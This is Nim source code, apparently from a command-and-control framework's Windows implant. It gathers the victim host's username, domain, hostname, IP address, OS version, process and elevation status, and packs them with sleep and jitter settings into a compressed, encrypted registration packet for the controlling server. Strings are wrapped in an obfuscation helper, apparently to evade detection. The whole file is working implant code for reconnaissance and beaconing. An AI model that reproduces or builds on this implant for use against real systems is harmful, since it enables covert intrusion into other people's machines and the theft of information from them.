import winim, os, net, strformat, strutils, registry, zippy

import ../../common/[types, serialize, sequence, crypto, utils]
import ../../modules/manager

# Hostname/Computername
proc getHostname(): string = 
    var
        buffer = newWString(CNLEN + 1) 
        dwSize = DWORD buffer.len

    GetComputerNameW(&buffer, &dwSize)
    return $buffer[0 ..< int(dwSize)]

# Domain Name
proc getDomain(): string = 
    const ComputerNameDnsDomain = 2 # COMPUTER_NAME_FORMAT (https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/ne-sysinfoapi-computer_name_format)
    var
        buffer = newWString(UNLEN + 1) 
        dwSize = DWORD buffer.len

    GetComputerNameExW(ComputerNameDnsDomain, &buffer, &dwSize)
    return $buffer[0 ..< int(dwSize)]

# Username
proc getUsername(): string = 
    const NameSamCompatible = 2 # EXTENDED_NAME_FORMAT (https://learn.microsoft.com/de-de/windows/win32/api/secext/ne-secext-extended_name_format) 
    
    var
        buffer = newWString(UNLEN + 1) 
        dwSize = DWORD buffer.len

    if getDomain() != "": 
        # If domain-joined, return username in format DOMAIN\USERNAME
        GetUserNameExW(NameSamCompatible, &buffer, &dwSize)
    else: 
        # If not domain-joined, only return USERNAME
        discard GetUsernameW(&buffer, &dwSize)

    return $buffer[0 ..< int(dwSize) - 1]

# Current process name
proc getProcessExe(): string = 
    let 
        hProcess: HANDLE = GetCurrentProcess() 
        buffer = newWString(MAX_PATH + 1)

    try:
        if hProcess != 0: 
            if GetModuleFileNameExW(hProcess, 0, buffer, MAX_PATH): 
                # .extractFilename() from the 'os' module gets the name of the executable from the full process path
                # We replace trailing NULL bytes to prevent them from being sent as JSON data
                return string($buffer).extractFilename().replace("\u0000", "")
    finally: 
        CloseHandle(hProcess)

# Current process ID
proc getProcessId(): int = 
    return int(GetCurrentProcessId()) 

# Current process elevation/integrity level
proc isElevated(): bool = 
    # isAdmin() function from the 'os' module returns whether the process is executed with administrative privileges
    return isAdmin() 

# IPv4 Address (Internal)
proc getIPv4Address(): string = 
    # getPrimaryIPAddr from the 'net' module finds the local IP address, usually assigned to eth0 on LAN or wlan0 on WiFi, used to reach an external address. No traffic is sent
    return $getPrimaryIpAddr()

# Windows Version fingerprinting
type 
    ProductType = enum
        UNKNOWN = 0
        WORKSTATION = 1
        DC = 2
        SERVER = 3

# API Structs
type OSVersionInfoExW {.importc: protect("OSVERSIONINFOEXW"), header: protect("<windows.h>").} = object
    dwOSVersionInfoSize: ULONG
    dwMajorVersion: ULONG
    dwMinorVersion: ULONG
    dwBuildNumber: ULONG
    dwPlatformId: ULONG
    szCSDVersion: array[128, WCHAR]
    wServicePackMajor: USHORT
    wServicePackMinor: USHORT
    wSuiteMask: USHORT
    wProductType: UCHAR
    wReserved: UCHAR

proc getWindowsVersion(info: OSVersionInfoExW, productType: ProductType): string =
    let
        major = info.dwMajorVersion
        minor = info.dwMinorVersion
        build = info.dwBuildNumber
        spMajor = info.wServicePackMajor
    
    if major == 10 and minor == 0:
        if productType == WORKSTATION:
            if build >= 22000:
                return protect("Windows 11")
            else:
                return protect("Windows 10")

        else:
            case build:
                of 20348:
                    return protect("Windows Server 2022")
                of 17763:
                    return protect("Windows Server 2019")
                of 14393:
                    return protect("Windows Server 2016")
                else:
                    return protect("Windows Server 10.x (Build: ") & $build & protect(")")

    elif major == 6:
        case minor:
        of 3:
            if productType == WORKSTATION:
                return protect("Windows 8.1")
            else:
                return protect("Windows Server 2012 R2")
        of 2:
            if productType == WORKSTATION:
                return protect("Windows 8")
            else:
                return protect("Windows Server 2012")
        of 1:
            if productType == WORKSTATION:
                return protect("Windows 7")
            else:
                return protect("Windows Server 2008 R2") 
        of 0:
            if productType == WORKSTATION:
                return protect("Windows Vista")
            else:
                return protect("Windows Server 2008") 
        else: 
            discard

    elif major == 5:
        if minor == 2:
            if productType == WORKSTATION:
                return protect("Windows XP x64 Edition")
            else:
                return protect("Windows Server 2003")
        elif minor == 1:
            return protect("Windows XP")
    else: 
        discard 

    return protect("Unknown Windows Version") 

proc getProductType(): ProductType =
    # The product key is retrieved from the registry
    # HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions
    #   ProductType    REG_SZ    WinNT
    # Possible values are: 
    #   LanmanNT -> Server/Domain Controller
    #   ServerNT -> Server
    #   WinNT    -> Workstation

    # Using the 'registry' module, we can get the exact registry value
    case getUnicodeValue(protect("""SYSTEM\CurrentControlSet\Control\ProductOptions"""), protect("ProductType"), HKEY_LOCAL_MACHINE)
    of protect("WinNT"):
        return WORKSTATION
    of protect("ServerNT"):
        return SERVER
    of protect("LanmanNT"): 
        return DC

proc getOSVersion(): string = 
    
    proc rtlGetVersion(lpVersionInformation: var OSVersionInfoExW): NTSTATUS
        {.cdecl, importc: protect("RtlGetVersion"), dynlib: protect("ntdll.dll").}

    when defined(windows):
        var osInfo: OSVersionInfoExW
        discard rtlGetVersion(osInfo)
        # echo $int(osInfo.dwMajorVersion)
        # echo $int(osInfo.dwMinorVersion)
        # echo $int(osInfo.dwBuildNumber)

        # RtlGetVersion does not actually set the Product Type, which is required to differentiate 
        # between workstation and server systems. The value is set to 0, which would lead to all systems being "unknown"
        # Normally, a value of 1 indicates a workstation os, while other values represent servers
        # echo $int(osInfo.wProductType).toHex

        # We instead retrieve the     
        return getWindowsVersion(osInfo, getProductType())
    else:
        return protect("Unknown")

proc collectAgentMetadata*(ctx: AgentCtx): AgentRegistrationData = 
    
    return AgentRegistrationData(
        header: Header(
            magic: MAGIC,
            version: VERSION, 
            packetType: cast[uint8](MSG_REGISTER),
            flags: cast[uint16](FLAG_ENCRYPTED),
            size: 0'u32,
            agentId: string.toUuid(ctx.agentId),
            seqNr: nextSequence(string.toUuid(ctx.agentId)),                              
            iv: generateBytes(Iv),
            gmac: default(AuthenticationTag)
        ), 
        agentPublicKey: ctx.agentPublicKey,
        metadata: AgentMetadata(
            listenerId: string.toUuid(ctx.listenerId),
            username: string.toBytes(getUsername()),
            hostname: string.toBytes(getHostname()),
            domain: string.toBytes(getDomain()),
            ip: string.toBytes(getIPv4Address()),
            os: string.toBytes(getOSVersion()),
            process: string.toBytes(getProcessExe()),
            pid: cast[uint32](getProcessId()),
            isElevated: cast[uint8](isElevated()),
            sleep: cast[uint32](ctx.sleepSettings.sleepDelay),
            jitter: cast[uint32](ctx.sleepSettings.jitter),
            modules: cast[uint32](MODULES)
        )
    )

proc serializeRegistrationData*(ctx: AgentCtx, data: var AgentRegistrationData): seq[byte] = 

    var packer = Packer.init()

    # Serialize registration data
    packer 
        .add(data.metadata.listenerId)
        .addDataWithLengthPrefix(data.metadata.username)
        .addDataWithLengthPrefix(data.metadata.hostname)
        .addDataWithLengthPrefix(data.metadata.domain)
        .addDataWithLengthPrefix(data.metadata.ip)
        .addDataWithLengthPrefix(data.metadata.os)
        .addDataWithLengthPrefix(data.metadata.process)
        .add(data.metadata.pid)
        .add(data.metadata.isElevated)
        .add(data.metadata.sleep)
        .add(data.metadata.jitter)
        .add(data.metadata.modules)

    let metadata = packer.pack()
    packer.reset()

    # Compress payload body
    let compressedPayload = compress(metadata, BestCompression, dfGzip)

    # Encrypt metadata
    let (encData, gmac) = encrypt(ctx.sessionKey, data.header.iv, compressedPayload, data.header.seqNr)

    # Set authentication tag (GMAC)
    data.header.gmac = gmac

    # Serialize header
    let header = packer.serializeHeader(data.header, uint32(encData.len))
    packer.reset()

    # Serialize the agent's public key to add it to the header
    packer.addData(data.agentPublicKey)
    let publicKey = packer.pack()

    return header & publicKey & encData
